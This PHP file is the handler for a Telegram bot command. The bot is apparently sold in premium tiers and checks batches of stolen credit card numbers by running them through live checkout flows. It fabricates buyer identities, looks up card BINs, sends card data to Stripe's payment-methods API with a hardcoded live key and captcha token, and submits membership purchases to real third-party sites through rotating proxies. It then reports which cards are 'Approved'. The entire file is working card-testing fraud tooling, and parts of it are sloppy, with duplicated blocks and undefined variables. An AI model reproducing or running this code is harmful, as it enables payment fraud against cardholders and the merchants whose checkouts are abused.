<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
/*//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";
$gate = "Paypal mass";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "Codez";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "Codez";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}


//=======RANK DETERMINE END=========//*/
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//
$r = "0";

$r = rand(0, 100);
//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/xcn|\.xcn|!xcn)/', $text)) {
    $userid = $update['message']['from']['id'];
  include 'config.php';
    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
    }
    $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";
    $messageidtoedit1 = bot('sendmessage', [
        'chat_id' => $chat_id,
        'text' => "𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');


    $message = substr($message, 6);
    $lista = $message;

    if (empty($message)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "Invalid details[1] \nFormat -> cc|mm|yy|cvv",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
        return;
    }

    $aray = gibarray($message);
    $cout = count($aray);
  /*function getMaxInput($userId) {
      $maxInput = 15; // Default max input

      // Check if user exists in owner.txt
      $ownerFile = 'Database/owner.txt';
      if (file_exists($ownerFile)) {
          $owners = file($ownerFile, FILE_IGNORE_NEW_LINES);
          foreach ($owners as $owner) {
              list($user, $max) = explode(' ', $owner);
              if ($user == $userId) {
                  $maxInput = intval($max);
                  break;
              }
          }
      }

      // Check if user exists in paid.txt
      $paidFile = 'Database/paid.txt';
      if (file_exists($paidFile)) {
          $lines = file($paidFile, FILE_IGNORE_NEW_LINES);
          foreach ($lines as $line) {
              list($user, $expDate) = explode(' ', $line);
              if ($user == $userId) {
                  // Do something with $expDate
                  break;
              }
          }
      }

      return $maxInput;
  }
  $maxInput = getMaxInput($userId);*/
    if ($cout > 10) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "Only 10 cc allowed",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
        return;
    }
    global $fullmes;
    $fullmes = '';
    sleep(1);
    foreach ($aray as $lista) {
        $lista = clean($lista);
        $partes = multiexplode(array(":", "|", "/", " "), $lista);

        $cc = $partes[0];
        $mes = $partes[1];
        $ano = $partes[2];
        $cvv = $partes[3];
        $mes = ltrim($mes, '0');
        $ano = strlen($ano) == 2 ? '20' . $ano : $ano;

        $ccbin = substr($cc, 0, 6);

        if (empty($cc) || empty($cvv) || empty($mes) || empty($ano)) {
            bot('editMessageText', [
                'chat_id' => $chat_id,
                'message_id' => $messageidtoedit,
                'text' => "<b>- - - - - - - - - - - - - - - - - - - - -\nGateway ✅ Paypal Mass [0.01$]\n- - - - - - - - - - - - - - - - - - - - -\nFormat: cc|mon|year|cvv\n- - - - - - - - - - - - - - - - - - - - -</b>",
                'parse_mode' => 'html',
                'disable_web_page_preview' => 'true'
            ]);
            return;
        };
        $lista = "<code>$cc|$mes|$ano|$cvv</code>";

        $proxiee = null;
        $pass = null;
        $cookieFile = getcwd() . '/cookies.txt';



        $firstname = ucfirst(str_shuffle('anthonysudiaj'));
        $lastname = ucfirst(str_shuffle('pitoshduajdb'));
        $street = "" . rand(0000, 9999) . " Main Street";
        $ph = array("682", "346", "246");
        $ph1 = array_rand($ph);
        $phh = $ph[$ph1];
        $phone = "$phh" . rand(0000000, 9999999) . "";
        $email = 'anthoyn' . $firstname . 'us82j37' . $phone . '@gmail.com';
        $st = array("AL", "NY", "CA", "FL", "WA");
        $st1 = array_rand($st);
        $statee = $st[$st1];
        if ($statee == "NY") {
            $state = $statee;
            $postcode = "10080";
            $city = "New York";
        } elseif ($statee == "WA") {
            $state = $statee;
            $postcode = "98001";
            $city = "Auburn";
        } elseif ($statee == "AL") {
            $state = $statee;
            $postcode = "35005";
            $city = "Adamsville";
        } elseif ($statee == "FL") {
            $state = $statee;
            $postcode = "32003";
            $city = "Orange Park";
        } else {
            $state = $statee;
            $postcode = "90201";
            $city = "Bell";
        };

          //==================[Randomizing Details]======================//
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIE, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $resposta = curl_exec($ch);
        $firstname = value($resposta, '"first":"', '"');
        $lastname = value($resposta, '"last":"', '"');
        $phone = value($resposta, '"phone":"', '"');
        $zip = value($resposta, '"postcode":', ',');
        $postcode = value($resposta, '"postcode":', ',');
        $state = value($resposta, '"state":"', '"');
        $city = value($resposta, '"city":"', '"');
        $street = value($resposta, '"street":"', '"');
        $numero1 = substr($phone, 1,3);
        $numero2 = substr($phone, 6,3);
        $numero3 = substr($phone, 10,4);
        $num = $numero1.''.$numero2.''.$numero3;
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        if($state=="Alabama"){ $state="AL";
        }else if($state=="alaska"){ $state="AK";
        }else if($state=="arizona"){ $state="AR";
        }else if($state=="california"){ $state="CA";
        }else if($state=="olorado"){ $state="CO";
        }else if($state=="connecticut"){ $state="CT";
        }else if($state=="delaware"){ $state="DE";
        }else if($state=="district of columbia"){ $state="DC";
        }else if($state=="florida"){ $state="FL";
        }else if($state=="georgia"){ $state="GA";
        }else if($state=="hawaii"){ $state="HI";
        }else if($state=="idaho"){ $state="ID";
        }else if($state=="illinois"){ $state="IL";
        }else if($state=="indiana"){ $state="IN";
        }else if($state=="iowa"){ $state="IA";
        }else if($state=="kansas"){ $state="KS";
        }else if($state=="kentucky"){ $state="KY";
        }else if($state=="louisiana"){ $state="LA";
        }else if($state=="maine"){ $state="ME";
        }else if($state=="maryland"){ $state="MD";
        }else if($state=="massachusetts"){ $state="MA";
        }else if($state=="michigan"){ $state="MI";
        }else if($state=="minnesota"){ $state="MN";
        }else if($state=="mississippi"){ $state="MS";
        }else if($state=="missouri"){ $state="MO";
        }else if($state=="montana"){ $state="MT";
        }else if($state=="nebraska"){ $state="NE";
        }else if($state=="nevada"){ $state="NV";
        }else if($state=="new hampshire"){ $state="NH";
        }else if($state=="new jersey"){ $state="NJ";
        }else if($state=="new mexico"){ $state="NM";
        }else if($state=="new york"){ $state="LA";
        }else if($state=="north carolina"){ $state="NC";
        }else if($state=="north dakota"){ $state="ND";
        }else if($state=="Ohio"){ $state="OH";
        }else if($state=="oklahoma"){ $state="OK";
        }else if($state=="oregon"){ $state="OR";
        }else if($state=="pennsylvania"){ $state="PA";
        }else if($state=="rhode Island"){ $state="RI";
        }else if($state=="south carolina"){ $state="SC";
        }else if($state=="south dakota"){ $state="SD";
        }else if($state=="tennessee"){ $state="TN";
        }else if($state=="texas"){ $state="TX";
        }else if($state=="utah"){ $state="UT";
        }else if($state=="vermont"){ $state="VT";
        }else if($state=="virginia"){ $state="VA";
        }else if($state=="washington"){ $state="WA";
        }else if($state=="west virginia"){ $state="WV";
        }else if($state=="wisconsin"){ $state="WI";
        }else if($state=="wyoming"){ $state="WY";
        }else{$state="KY";} 

          if (empty($scheme)) {
              $scheme = "N/A";
          }
          if (empty($type)) {
              $type = "N/A";
          }
          if (empty($brand)) {
              $brand = "N/A";
          }
          if (empty($bank)) {
              $bank = "N/A/N/A";
          }
          if (empty($name)) {
              $name = "N/A";
          }
          if (empty($emoji)) {
              $emoji = "N/A";
          }
          if (empty($currency)) {
              $currency = "N/A";
          }

        //==============[Randomizing Details-END]======================//
        sleep(1);
            edit_sent_message($chatId, $sent_message_id, "<b>
        𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
        </b>");


          //==================[BIN LOOK-UP]======================//

          $ch = curl_init();

          $bin = substr($cc, 0, 6);

          curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            $ch = curl_init();

            $bin = substr($cc, 0, 6);

            curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $bindata = curl_exec($ch);
            $binna = json_decode($bindata, true);
            $brand = $binna['scheme'];
            $country = $binna['country']['name'];
            $alpha2 = $binna['country']['alpha2'];
            $emoji = $binna['country']['emoji'];
            $type = $binna['type'];
            $category = $binna['category'];
            $bank = $binna['bank']['name'];
            $url = $binna['bank']['url'];
            $phone = $binna['bank']['phone'];
            curl_close($ch);

            $bank = "$bank";
            $country = "$country $emoji ";
            $bin = "$bin - ($alpha2) -[$emoji] ";
            $bininfo = "$type - $brand - $category";
            $url = "$url";
            $type = strtoupper($type);


        //==================[BIN LOOK-UP-END]======================//



        sleep(1);
            edit_sent_message($chatId, $sent_message_id, "<b>
        𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃...
        </b>");  
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://worthitorwoke.com/membership-account/membership-checkout/');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            $headers
        ]);

        # ----------------- [1req Postfields] ---------------------#

        $nonreq = curl_exec($ch);
        $nonce = trim(strip_tags(getStr($nonreq,'<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="','"')));
        //-------------------Req 2--------------//
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $socks5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_POST, 1);
        $headers = array();
        $headers[] = 'Host: api.stripe.com';
        $headers[] = 'Accept: application/json';
        $headers[] = 'Accept-Language: en-US,en;q=0.6';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Path: /v1/payment_methods';
        $headers[] = 'Origin: https://js.stripe.com';
        $headers[] = 'Referer: https://js.stripe.com/';
        $headers[] = 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"';
        $headers[] = 'sec-ch-ua-mobile: ?0';
        $headers[] = 'sec-ch-ua-platform: "Windows"';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Site: same-site';
        $headers[] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=a070fd6a-aa96-4483-81b9-34b45f7b69111e98c6&muid=47b3b239-b265-4845-813b-1dd9c2301397749a4a&sid=bb3d7e28-c6b8-4abf-8584-f192b63c0cd2a23726&pasted_fields=number&payment_user_agent=stripe.js%2F8de40c8431%3B+stripe-js-v3%2F8de40c8431%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=968610&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZGMrFyGyrq1G3mUExYwbtQb4kk5baLRlgcXxIiL9kdEpfmu6wUPtOvmSWGMbNG6I2RhUAh1PuBM76c3htvXm1QRcBnpULtz5tKpv30AE_GuhEDfa-4WsGtJz8U1aHs1Jlme2ZZf7mVY_yYj5jkr6cf245xZkWFB4yJABOrpvZ6HRRmL3D6PpqTI2b4JZEB8RbsTQtFTdqZlSWK_JbNtDnHGDKR4Ctt2yuLcIREztAldYC8GjbTgjXT_aRa4dc-2dQEPPZAYzsWsRSaVZHYolbrSxOd2OHREWcsusrQ69Rlq0DCc0McwQmRMbLRq0ciI2AYaufusfcZKxoC_JUtE4a6-YIhKhLVPD88AmCywSkNSM-DiUtoOknjzix1S8TwPWbbl8ojCxO-nPmLjST_bUClZWeEMGmjI6G3uN7qpj82Ec46MPgxCDcsAML_pO8emNgiXkdKCsEjRR3rsc-NBMtpvJkfqhgjJBcvvtKgAQUcyYLn280N8d2rTFcOdSUfI36NsVGNuV0EBqH--pHlooYEvrsmOPTN95mGs3zMxj2GQ_zy8DBre9qkyTaDjzlfz4qjG0s8_rjMDs4LbyD_so7dRVxMuvdpY5Fgqcf77cj9onBhGoDtBJWqxVQ65SUzL8KvNLCQQYfjrFztuP2xTV4UHyq-qsgbqQlxb0UHF7UOJxsuVRBsU_Xko8S09uNswIl3dUaONx4QYsF7EeE4nGQL4fbvax23IxzPv_YtCFGRGfP2ERAF9k0RIk5XiMEpq-FP68h5L1MOnLWx_XaNATGX_DtbHTsax2bfxJ0i78oQoxS3UEc6Bhk8KHAsbqE8YW0P822PMQaTxJ5OAPyzF6mjVcgWlg1nazOInieyWsQTvzab29FhK7C0WD80sUdRNkDY2TPwqQ2yr8w5WIQ7Cmogh2SVC64WAjdFg6bdKIWj5EFUEMmPupRb4njmXUO4cfxlz-icTauMq9Aun0mpjXxqeIbahlgwxVUGCBMyg84aYrWyA_cO8RpmZ6PtpcvdkTa4l_9lqNYJcOiwT5RWuOhPDAJPM3eQjkOT7B_kRkHygeHz3ROFLDtUyoa-FGSqgWNvevgnsxPHzMl6ATzICjjhhVmw6ETvdylX5I-Duc5A_ADuBtBsAG9l3tKDeg8NITXjfkLOu0L53BFmtRDdC30fkCU5a366VctDa2t1_V-LylZtELSBMmSe7JgnRs3PeklGju4B5ryXGJyC29nlzE_GX81b67GaviC5qIBqIDYRdPeoiJ_Fj_vSF7v18i8vJ6RjUsflBAgQw-fIvhdaN4vMS6WPcK-uD_8r42Ml8He4v-WeTfuqZK-z8bbLlWZMr_ez10vqUocF9MFs6BTFDNsyHfdSAV9OXcHeL3GJSY_a35_BPs-OfUK-7rMOncAHGizhewQsKvMtAChplQw1j4rxCTtRafzmwvc6PLdsZ73ukWBi1ZTNc3LQFmfvjqjoqLxa6axu2WfglL0vxc3G5Rxto-Ir1DJBgHtXOdS-DcKPgIx-VB0tycOW9GB87P3YAhUQ-RABDQGWswtzzqXycVbs6HglnNsSo1TtdXaYNqneqa-FzGIFcB9bf9zBDvkM5y1sS353-g35wGVWAGY5RukSrw-d3w9dWwIhConxCVqC4o9ljh89TATRCsi8-LQIX5lITzpQeZa8aJT3cTRSWK3M_ueSQLlV3LXR_Mp_AuGg1fU-jDeN-YCwc_yFsQTz2Lk-BUTsv8j6UBKJrIk9cZ0v1tO_HcDCSmgkmU-QRoeSNXIk916T0ofEiBmCE6KhCD9rDSHypmNy_0KgLh4vfXirUQm49YdGMPkc-7ngUELsIVA-w2AGUDrQNtTOnwCGM_p39QRy4txqt5RkvrOATL7O-xLfk7N-GROr7ZClvKxPU10PcUww1UdCmKs8FhK5a210v2KWzz2nBqEMdHuDoaPcBSOKaE3HpETKvx6V-dftHicGGT8ySgRV5OcMQKv6oI3lbY0cEnIcHtShk_T6Zj0uCsEGACcWJZ9vNxSilht-i3noEqBUPJvMmnQrY-sAFjC0vEeEojRlIWxSuLaXbLd8Hm29R8mIwCKQ5qwD6szEvWXY717Ln1kizZsBwokWh-tW7U7zwf6uGLukuVTPJ43DOGBBfD3lM6NleHDOZnr-H6hzaGFyZF9pZM4VmeRUomtyqDRiMzg4NGEyonBkAA.xEQ2CILi7xUS3fbxf-RzknJRKrc9Di2bsWeH4m83Ug8');

        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

        echo $result1 = curl_exec($ch);
        $id = trim(strip_tags(getStr($result1,'"id": "','"')));
        //==================req 1end===============//
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $socks5);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
        curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_POST, 1);
        $headers = array();
        $headers[] = 'authority: www.yasminmogahedtv.com';
        $headers[] =  'method: POST';
        $headers[] =  'path: /membership-account/membership-checkout/';
        $headers[] =  'scheme: https';
        $headers[] =  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
        $headers[] =  'accept-language: en-US,en;q=0.6';
        $headers[] =  'content-type: application/x-www-form-urlencoded';
        $headers[] =  'cookie: __stripe_mid=47b3b239-b265-4845-813b-1dd9c2301397749a4a; PHPSESSID=i12a5ae7v3k19ekcaaelk15a32; pmpro_visit=1; __stripe_sid=bb3d7e28-c6b8-4abf-8584-f192b63c0cd2a23726';
        $headers[] =  'origin: https://www.yasminmogahedtv.com';
        $headers[] =  'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/';
        $headers[] =  'sec-fetch-dest: document';
        $headers[] =  'sec-fetch-mode: navigate';
        $headers[] =  'sec-fetch-site: same-origin';
        $headers[] =  'user-agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username='.$lastname.'&password=mmmmmmmm&password2=mmmmmmmm&bemail='.$email.'%40gmail.com&bconfirmemail='.$email.'%40gmail.com&fullname=&telephone=3234267080&CardType=mastercard&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX8435&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

        echo $result2 = curl_exec($ch);
        $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));


             if (
              strpos($result2, 'Thank you for your membership.') !== false ||
              strpos($result2, "Membership Confirmation") !== false ||
              strpos($result2, "Thank You For Donation.") !== false ||
              strpos($result2, "Success ") !== false ||
              strpos($result2, '"type":"one-time"') !== false ||
              strpos($result2, "/donations/thank_you?donation_number=") !== false
          ) {
              $msg = "$msg";
                   $es = "Approved! ✅";
          } elseif (
              strpos($result2, "insufficient_funds") !== false ||
              strpos($result2, "Your card has insufficient funds.") !== false ||
              strpos($result2, '"status":"success"') !== false
          ) {
              $msg = "$msg";
                   $es = "Approved! ✅";
          } elseif (
              strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
              strpos($result2, "Your card does not support this type of purchase.") !== false ||
              strpos($result2, 'transaction_not_allowed') !== false
          ) {
              $msg = "Your card does not support this type of purchase";
                   $es = "Approved! ✅";
          } elseif (
              strpos($result2, 'incorrect_zip') !== false ||
              strpos($result2, 'Your card zip code is incorrect.') !== false
          ) {
              $msg = "$msg";
              $es = "Approved! ✅";
          } elseif (
              strpos($result2, "stripe_3ds2_fingerprint") !== false
          ) {
              $msg = "Security [3Ds]";
                   $es = "Approved! ✅";
          } elseif (
              strpos($result2, 'security code is incorrect.') !== false ||
              strpos($result2, 'security code is invalid.') !== false ||
              strpos($result2, "incorrect_cvc") !== false
          ) {
                $msg = "$msg";
                   $es = "Approved! ✅";
          } elseif (
              strpos($result2, "Error updating default payment method. Your card was declined.") !== false ||
              strpos($result2, "Unknown error generating account. Please contact us to set up your membership.") !== false
          ) {
              $msg = "Card Declined";
              $es = 'Declined ❌';
          } else {
              $es = 'Declined ❌';
          }

      $end_time = microtime(true);
      $time = number_format($end_time - $start_time, 2);

        unlink($cookieFile);
      $fullmes = $fullmes . "⌬ 𝐂𝐚𝐫𝐝 ↯ $lista" . " \n⌬ 𝐒𝐓𝐀𝐓𝐔𝐒 ↯ " . $es . "\n⌬ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg\n⌬ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ STRIPE CCN 10$\n";


        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoedit,
            'text' => "
Stripe Charge 10$

$fullmes

⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>Live ✅</code>
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time seconds</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ @$username [$rank]
    ",
            'parse_mode' => 'html',
            'disable_web_page_preview' => 'true'
        ]);
    }
}
